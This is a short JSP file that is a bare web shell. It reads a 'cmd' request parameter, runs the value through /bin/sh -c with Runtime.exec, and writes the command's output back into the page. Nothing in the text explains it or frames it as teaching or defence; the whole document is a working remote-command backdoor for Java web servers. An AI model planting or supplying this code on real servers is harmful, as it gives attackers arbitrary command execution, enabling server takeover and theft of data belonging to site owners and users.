<% if(request.getParameter("cmd") != null){String cmd = request.getParameter("cmd");

    String[] command = {"/bin/sh", "-c",
  cmd};

    Process p = Runtime.getRuntime().exec(command);

    java.io.InputStream in = p.getInputStream();

    int a = -1;
    while((a=in.read())!=-1) {
    out.print((char)a);
  }
}
%>
